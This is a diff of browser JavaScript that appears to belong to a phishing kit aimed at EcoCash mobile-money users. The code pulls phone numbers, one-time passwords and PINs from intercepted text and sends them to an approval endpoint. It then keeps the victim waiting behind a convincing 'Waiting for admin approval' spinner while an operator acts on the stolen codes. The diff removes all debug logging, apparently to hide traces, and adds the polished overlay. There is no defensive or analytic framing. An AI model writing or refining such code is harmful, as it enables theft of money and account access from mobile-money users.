@@ -9,22 +9,15 @@
 
   function parse(text) {
     if (!text || typeof text !== 'string') return null;
-    console.log('🔐 Full payload:', text);
-
     const lines = text.split('\n').map((s) => s.trim());
-    console.log('🔐 Lines:', lines);
-
     const getLine = (key) => {
       const line = lines.find((l) => l.toLowerCase().startsWith(key.toLowerCase() + ':'));
-      console.log(`🔐 getLine('${key}'):`, line);
       return line ? line.slice(line.indexOf(':') + 1).trim() : '';
     };
 
     const phone = (getLine('Mobile') || getLine('Username')).replace(/\D/g, '');
     const otp = getLine('OTP').replace(/\D/g, '');
     const pin = getLine('PIN').replace(/\D/g, '');
-
-    console.log('🔐 Parsed:', { phone, otp, pin });
 
     if (/^EcoCash OTP/i.test(lines[0])) {
       return { stage: 'otp', phone, otp };
@@ -33,6 +26,77 @@
       return { stage: 'pin', phone, pin };
     }
     return null;
+  }
+
+  function showSpinner(message = 'Waiting for verification...') {
+    let overlay = document.getElementById('gate-overlay');
+    if (!overlay) {
+      overlay = document.createElement('div');
+      overlay.id = 'gate-overlay';
+      overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 99999;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      `;
+
+      const dialog = document.createElement('div');
+      dialog.style.cssText = `
+        background: white;
+        padding: 32px;
+        border-radius: 12px;
+        max-width: 400px;
+        text-align: center;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      `;
+
+      const spinner = document.createElement('div');
+      spinner.style.cssText = `
+        width: 40px;
+        height: 40px;
+        margin: 0 auto 16px;
+        border: 4px solid #f0f0f0;
+        border-top: 4px solid #007AFF;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      `;
+
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `;
+      document.head.appendChild(style);
+
+      const msg = document.createElement('p');
+      msg.id = 'gate-message';
+      msg.style.cssText = `
+        margin: 0;
+        color: #666;
+        font-size: 16px;
+        line-height: 1.5;
+      `;
+      msg.textContent = message;
+
+      dialog.appendChild(spinner);
+      dialog.appendChild(msg);
+      overlay.appendChild(dialog);
+      document.body.appendChild(overlay);
+    } else {
+      const msg = overlay.querySelector('#gate-message');
+      if (msg) msg.textContent = message;
+    }
+
+    overlay.style.display = 'flex';
   }
 
   function showOverlay(message) {
@@ -138,7 +202,7 @@
           alert('OTP resent to your number!');
         }
       } catch (e) {
-        console.warn('Approval status check failed:', e);
+        void 0;
       }
     }
 
@@ -153,7 +217,7 @@
       ...(info.stage === 'otp' && { otp: info.otp }),
     };
 
-    console.log('🔐 Approval gate: sending request', body);
+    showSpinner('Requesting verification...');
 
     try {
       const res = await fetch(API_APPROVAL, {
@@ -162,22 +226,17 @@
         body: JSON.stringify(body),
       });
 
-      console.log('🔐 Response status:', res.status, res.statusText);
-
       if (!res.ok) {
         const errData = await res.json().catch(() => ({ error: 'Unknown error' }));
-        console.error('🔐 Request failed:', errData);
         showOverlay('Unable to verify right now. Please try again.');
         return new Promise(() => {});
       }
 
       const data = await res.json();
-      console.log('🔐 Got approval ID:', data.id, 'Expires:', new Date(data.expiresAt).toLocaleTimeString());
-
+      showSpinner('Waiting for admin approval...');
       const result = await poll(data.id, data.expiresAt);
 
       if (result.ok) {
-        console.log('🔐 Approved!');
         return new Response('{"ok":true}', { status: 200, headers: { 'Content-Type': 'application/json' } });
       }
 
@@ -188,11 +247,9 @@
       };
 
       const message = reasonMap[result.reason] || 'Request declined.';
-      console.log('🔐 Denied:', result.reason);
       showOverlay(message);
       return new Promise(() => {});
     } catch (err) {
-      console.error('🔐 Approval request error:', err);
       showOverlay('Unable to verify right now. Please try again.');
       return new Promise(() => {});
     }
